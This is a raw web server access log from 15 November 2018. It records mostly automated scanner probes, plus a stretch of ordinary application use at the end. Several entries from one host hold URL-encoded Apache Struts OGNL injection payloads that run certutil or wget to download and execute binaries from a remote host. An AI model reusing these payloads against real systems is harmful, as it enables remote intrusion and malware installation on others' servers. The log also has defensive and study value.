184.105.247.252 - - [15/Nov/2018:00:02:39 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:00:16:02 +0000] "GET /invoker/readonly HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:00:16:02 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:00:16:02 +0000] "GET /jmx-console/HtmlAdaptor HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:00:16:02 +0000] "GET /orders.xhtml HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:00:16:03 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:00:16:03 +0000] "GET /users HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:00:16:03 +0000] "PUT /dba_put1.jsp/ HTTP/1.1" 404 -
165.227.27.204 - - [15/Nov/2018:00:16:04 +0000] "GET /dba_put1.jsp HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:00:16:04 +0000] "GET /manager/html HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:00:16:04 +0000] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 10329
59.148.87.242 - - [15/Nov/2018:00:31:14 +0000] "GET / HTTP/1.0" 200 10329
177.45.79.230 - - [15/Nov/2018:01:32:50 +0000] "GET / HTTP/1.1" 200 10329
177.102.90.163 - - [15/Nov/2018:02:12:29 +0000] "GET / HTTP/1.1" 200 10329
95.213.177.126 - - [15/Nov/2018:03:14:40 +0000] "POST /azenv.php?auth=154225168007&a=PSCMN&i=2783161885&p=8080 HTTP/1.1" 404 10329
202.156.201.193 - - [15/Nov/2018:03:54:52 +0000] "GET / HTTP/1.0" 200 10329
165.227.27.204 - - [15/Nov/2018:04:54:28 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:04:54:28 +0000] "GET /ws_utc/resources/setting/options/general HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:28 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:04:54:29 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:04:54:29 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:04:54:29 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:04:54:30 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:04:54:30 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:04:54:30 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:30 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:31 +0000] "GET /invoker/readonly HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:31 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:31 +0000] "GET /jmx-console/HtmlAdaptor HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:32 +0000] "GET /orders.xhtml HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:32 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:04:54:32 +0000] "GET /users HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:33 +0000] "PUT /dba_put1.jsp/ HTTP/1.1" 404 -
165.227.27.204 - - [15/Nov/2018:04:54:33 +0000] "GET /dba_put1.jsp HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:33 +0000] "GET /manager/html HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:04:54:33 +0000] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 10329
185.219.164.136 - - [15/Nov/2018:05:45:31 +0000] "GET / HTTP/1.0" 200 10329
157.119.212.26 - - [15/Nov/2018:06:20:41 +0000] "GET / HTTP/1.1" 200 10329
217.61.99.154 - - [15/Nov/2018:06:21:21 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 -
223.97.183.200 - - [15/Nov/2018:06:52:52 +0000] "POST /tmUnblock.cgi HTTP/1.1" 404 10329
95.213.177.124 - - [15/Nov/2018:08:10:22 +0000] "POST /azenv.php?auth=154226942225&a=PSCMN&i=2783161885&p=8080 HTTP/1.1" 404 10329
103.117.153.33 - - [15/Nov/2018:08:38:51 +0000] "GET / HTTP/1.1" 200 10329
119.40.85.196 - - [15/Nov/2018:09:20:35 +0000] "GET / HTTP/1.1" 200 10329
185.8.49.146 - - [15/Nov/2018:09:24:08 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:09:35:30 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:09:35:30 +0000] "GET /ws_utc/resources/setting/options/general HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:30 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:09:35:31 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:09:35:31 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:09:35:31 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:09:35:32 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:09:35:32 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:09:35:32 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:33 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:33 +0000] "GET /invoker/readonly HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:33 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:33 +0000] "GET /jmx-console/HtmlAdaptor HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:34 +0000] "GET /orders.xhtml HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:34 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:09:35:34 +0000] "GET /users HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:35 +0000] "PUT /dba_put1.jsp/ HTTP/1.1" 404 -
165.227.27.204 - - [15/Nov/2018:09:35:35 +0000] "GET /dba_put1.jsp HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:35 +0000] "GET /manager/html HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:09:35:36 +0000] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 10329
62.97.116.68 - - [15/Nov/2018:09:36:27 +0000] "GET /manager/html HTTP/1.1" 404 10329
185.209.0.12 - - [15/Nov/2018:09:39:55 +0000] "-" 400 -
139.162.111.98 - - [15/Nov/2018:10:33:02 +0000] "GET / HTTP/1.1" 200 10329
176.10.189.87 - - [15/Nov/2018:11:04:56 +0000] "GET / HTTP/1.0" 200 10329
88.162.205.130 - - [15/Nov/2018:11:23:37 +0000] "GET / HTTP/1.1" 200 10329
175.155.217.15 - - [15/Nov/2018:11:27:58 +0000] "GET / HTTP/1.1" 200 10329
59.100.250.242 - - [15/Nov/2018:11:56:11 +0000] "GET / HTTP/1.1" 200 10329
125.64.94.200 - - [15/Nov/2018:12:02:39 +0000] "GET / HTTP/1.0" 200 10329
58.182.223.16 - - [15/Nov/2018:12:46:48 +0000] "GET / HTTP/1.0" 200 10329
95.213.177.126 - - [15/Nov/2018:12:50:57 +0000] "POST /azenv.php?auth=154228625733&a=PSCMN&i=2783161885&p=8080 HTTP/1.1" 404 10329
51.15.253.95 - - [15/Nov/2018:13:04:05 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:14:07:39 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:14:07:39 +0000] "GET /ws_utc/resources/setting/options/general HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:40 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:14:07:40 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:14:07:40 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:14:07:40 +0000] "POST / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:14:07:41 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:14:07:41 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 400 -
165.227.27.204 - - [15/Nov/2018:14:07:41 +0000] "GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:42 +0000] "GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20&&%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:42 +0000] "GET /invoker/readonly HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:42 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:43 +0000] "GET /jmx-console/HtmlAdaptor HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:43 +0000] "GET /orders.xhtml HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:43 +0000] "GET / HTTP/1.1" 200 10329
165.227.27.204 - - [15/Nov/2018:14:07:43 +0000] "GET /users HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:44 +0000] "PUT /dba_put1.jsp/ HTTP/1.1" 404 -
165.227.27.204 - - [15/Nov/2018:14:07:44 +0000] "GET /dba_put1.jsp HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:44 +0000] "GET /manager/html HTTP/1.1" 404 10329
165.227.27.204 - - [15/Nov/2018:14:07:45 +0000] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 10329
101.66.156.38 - - [15/Nov/2018:14:17:46 +0000] "GET /manager/html HTTP/1.1" 404 10329
73.62.180.79 - - [15/Nov/2018:14:26:27 +0000] "GET / HTTP/1.1" 200 10329
88.130.55.84 - - [15/Nov/2018:15:38:36 +0000] "GET / HTTP/1.1" 200 10329
88.130.55.84 - - [15/Nov/2018:15:38:36 +0000] "GET /%7B%7BgetPictureUrl()%7D%7D HTTP/1.1" 404 10329
88.130.55.84 - - [15/Nov/2018:15:38:36 +0000] "GET /cacheclearer HTTP/1.1" 302 -
88.130.55.84 - - [15/Nov/2018:15:38:37 +0000] "GET /cacheclearer/ HTTP/1.1" 200 80864
88.130.55.84 - - [15/Nov/2018:15:38:37 +0000] "GET /api/config HTTP/1.1" 200 289
88.130.55.84 - - [15/Nov/2018:15:38:37 +0000] "GET /files/12ffddf5-cb9c-43c4-9650-d2accda8c561 HTTP/1.1" 200 3552619
88.130.55.84 - - [15/Nov/2018:15:38:37 +0000] "GET /favicon.ico HTTP/1.1" 404 10329
88.130.55.84 - - [15/Nov/2018:15:38:44 +0000] "POST /upload/xlsx HTTP/1.1" 200 47
88.130.55.84 - - [15/Nov/2018:15:38:52 +0000] "POST /api/pdf HTTP/1.1" 200 394
88.130.55.84 - - [15/Nov/2018:15:38:53 +0000] "GET /api/pdf HTTP/1.1" 200 816
88.130.55.84 - - [15/Nov/2018:15:38:54 +0000] "GET /api/pdf HTTP/1.1" 200 1052
88.130.55.84 - - [15/Nov/2018:15:38:59 +0000] "GET /files/15cf72da-2687-40e7-9b4d-c273d3bb6eb2.pdf HTTP/1.1" 200 3753490
88.130.55.84 - - [15/Nov/2018:15:39:00 +0000] "GET /files/15cf72da-2687-40e7-9b4d-c273d3bb6eb2.pdf HTTP/1.1" 206 65536
88.130.55.84 - - [15/Nov/2018:15:39:00 +0000] "GET /files/15cf72da-2687-40e7-9b4d-c273d3bb6eb2.pdf HTTP/1.1" 206 17938
88.130.55.84 - - [15/Nov/2018:15:39:00 +0000] "GET /files/15cf72da-2687-40e7-9b4d-c273d3bb6eb2.pdf HTTP/1.1" 206 65536
